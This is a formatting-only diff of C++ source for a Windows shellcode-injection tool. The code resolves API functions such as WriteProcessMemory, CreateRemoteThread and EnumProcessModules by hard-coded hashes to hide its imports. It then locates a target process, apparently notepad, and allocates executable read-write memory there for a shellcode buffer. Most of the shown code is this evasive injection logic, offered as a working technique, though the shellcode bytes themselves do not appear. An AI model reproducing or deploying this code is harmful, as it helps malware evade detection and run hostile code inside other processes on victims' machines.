@@ -76,7 +76,8 @@ inline LPVOID get_func_by_name(LPVOID module, char* func_name)
         return NULL;
     }
     IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
-    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
+    IMAGE_DATA_DIRECTORY* exportsDir =
+        &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
     if (exportsDir->VirtualAddress == NULL) {
         return NULL;
     }
@@ -93,7 +94,8 @@ inline LPVOID get_func_by_name(LPVOID module, char* func_name)
     for (SIZE_T i = 0; i < namesCount; i++) {
         DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
         WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
-        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));
+        DWORD* funcRVA =
+          (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));
 
         LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
         size_t k = 0;
@@ -163,16 +165,22 @@ PDWORD getFunctionAddressByHash(char* library, DWORD hash)
 	HMODULE libraryBase = LoadLibraryA(library);
 
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
-	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
+	PIMAGE_NT_HEADERS imageNTHeaders =
+    (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
 
-	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+	DWORD_PTR exportDirectoryRVA =
+imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
 
-	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+	PIMAGE_EXPORT_DIRECTORY imageExportDirectory =
+    (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
 
 	// Get RVAs to exported function related information
-	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
-	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
-	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
+	PDWORD addresOfFunctionsRVA =
+(PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
+	PDWORD addressOfNamesRVA =
+(PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
+	PWORD addressOfNameOrdinalsRVA =
+(PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
 
 	// iterate the exports to get the required function
 	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
@@ -223,11 +231,13 @@ DWORD getPID(const TCHAR* processName) {
 
 	// Resolve the address of EnumProcessModules from the hash
 	PDWORD covertEnumProcessModules = getFunctionAddressByHash((char*)"kernel32", 0x6333ef38);
-	customEnumProcessModules EnumProcessModules = (customEnumProcessModules)covertEnumProcessModules;
+	customEnumProcessModules EnumProcessModules =
+    (customEnumProcessModules)covertEnumProcessModules;
 
 	// Resolve the address of GetModuleBaseNameW from the hash
 	PDWORD convertGetModuleBaseNameW = getFunctionAddressByHash((char*)"psapi", 0x9bfc0a3e);
-	customGetModuleBaseNameW getModuleBaseNameW = (customGetModuleBaseNameW)convertGetModuleBaseNameW;
+	customGetModuleBaseNameW getModuleBaseNameW =
+    (customGetModuleBaseNameW)convertGetModuleBaseNameW;
 
 	// Resolve the address of CloseHandle from the hash
 	PDWORD convertCloseHandle = getFunctionAddressByHash((char*)"kernel32", 0xfaba0065);
@@ -260,7 +270,11 @@ DWORD getPID(const TCHAR* processName) {
 				// Retrieves a handle for each module in the specified process
 				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
 				{	// Retrieves the base name of the specified module
-					getModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
+					getModuleBaseNameW(
+                hProcess,
+                hMod,
+                szProcessName,
+                sizeof(szProcessName) / sizeof(TCHAR));
 				}
 			}
 			else {
@@ -310,11 +324,13 @@ int main()
 
 	// Resolve the address of WriteProcessMemory from the hash
 	PDWORD writeProcessMemoryFunction = getFunctionAddressByHash((char*)"kernel32", 0xc0088eea);
-	customWriteProcessMemory writeProcessMemory = (customWriteProcessMemory)writeProcessMemoryFunction;
+	customWriteProcessMemory writeProcessMemory =
+    (customWriteProcessMemory)writeProcessMemoryFunction;
 
 	// Resolve the address of CreateRemoteThread from the hash
 	PDWORD createRemoteThreadFunction = getFunctionAddressByHash((char*)"kernel32", 0xc398c463);
-	customCreateRemoteThread createRemoteThread = (customCreateRemoteThread)createRemoteThreadFunction;
+	customCreateRemoteThread createRemoteThread =
+    (customCreateRemoteThread)createRemoteThreadFunction;
 
 	// Resolve the address of CloseHandle from the hash
 	PDWORD convertCloseHandle = getFunctionAddressByHash((char*)"kernel32", 0xfaba0065);
@@ -322,7 +338,8 @@ int main()
 
 	// Resolve the address of WaitForSingleObject from the hash
 	PDWORD convertWaitForSingleObjectEx = getFunctionAddressByHash((char*)"kernel32", 0xf8d32811);
-	customWaitForSingleObjectEx waitForSingleObjectEx = (customWaitForSingleObjectEx)convertWaitForSingleObjectEx;
+	customWaitForSingleObjectEx waitForSingleObjectEx =
+    (customWaitForSingleObjectEx)convertWaitForSingleObjectEx;
 
 
 	std::cout << "[+] Executing OpenProcess ..." << std::endl;
@@ -334,7 +351,11 @@ int main()
 
 	// Allocate space in the memory of notepad
 	std::cout << "[+] Executing VirtualAllocEx ..." << std::endl;
-	LPVOID buffer = virtualAllocEx(hProcess, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	LPVOID buffer = virtualAllocEx(hProcess,
+                              NULL,
+                              sizeof shellcode,
+                              MEM_RESERVE | MEM_COMMIT,
+                              PAGE_EXECUTE_READWRITE);
 	if (buffer == NULL) {
 		std::cout << "[!] VirtualAllocEx Failed : " << GetLastError() << std::endl;
 		return -1;
